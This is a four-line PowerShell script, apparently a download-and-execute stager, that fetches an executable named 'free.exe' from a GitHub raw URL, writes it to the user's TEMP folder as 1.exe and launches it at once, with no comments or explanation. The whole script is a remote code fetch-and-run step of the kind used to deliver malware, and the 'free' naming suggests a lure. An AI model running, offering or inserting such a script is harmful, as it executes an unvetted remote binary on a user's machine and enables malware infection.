$url = "https://raw.githubusercontent.com/kittipatseepakdee-eng/freecri2/refs/heads/main/free.exe"
$file = "$env:TEMP\1.exe"

Invoke-WebRequest $url -OutFile $file
Start-Process $file